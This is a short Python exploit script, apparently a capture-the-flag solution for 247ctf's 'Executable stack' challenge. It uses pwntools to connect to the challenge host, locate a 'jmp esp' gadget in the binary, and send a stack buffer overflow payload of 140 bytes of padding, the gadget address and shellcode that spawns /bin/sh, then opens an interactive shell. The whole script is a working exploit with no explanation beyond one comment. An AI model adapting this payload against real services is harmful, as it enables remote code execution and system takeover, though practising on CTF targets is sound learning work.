#We are using "247ctf.com" An Executable stack
from pwn import *
import sys
context.update(arch='i386', os='linux')
#io = process("./executable_stack")

io = remote("361e0e76e15e7c18.247ctf.com", 50142)
"""
gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exit()
"""

binary = ELF("./executable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))
print(hex(jmp_esp))

exploit = flat(["A" * 140, pack(jmp_esp), asm(shellcraft.sh())])

io.sendline(exploit)
io.interactive()